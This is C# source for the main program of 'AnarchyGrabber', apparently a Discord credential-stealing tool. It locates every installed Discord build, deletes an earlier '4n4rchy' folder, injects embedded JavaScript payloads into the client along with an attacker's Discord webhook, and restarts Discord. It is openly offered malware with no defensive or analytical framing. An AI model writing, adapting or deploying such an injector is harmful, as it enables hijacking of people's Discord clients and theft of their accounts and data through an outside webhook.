using System;
using System.IO;

namespace AnarchyGrabber
{
    class Program
    {
        static void Main()
        {
            // decrypt files
            OxygenFile injectFile = new OxygenFile("inject.js", Resources.inject);
            OxygenFile modFile = new OxygenFile("discordmod.js", Resources.discordmod);

            foreach (DiscordBuild build in Enum.GetValues(typeof(DiscordBuild)))
            {
                if (OxygenInjector.TryGetDiscordPath(build, out string path))
                {
                    string anarchyPath = Path.Combine(path, "4n4rchy");

                    if (Directory.Exists(anarchyPath))
                        Directory.Delete(anarchyPath, true);
                }

                if (OxygenInjector.Inject(build, "4n4rchy", "inject", $"process.env.anarchyHook = '{Settings.Webhook.Replace("https://discordapp.com/api/webhooks/", "")}'", injectFile, modFile) && build == DiscordBuild.Discord)
                    OxygenInjector.RestartDiscord(); // Oxygen can only restart Discord Stable atm
            }
        }
    }
}
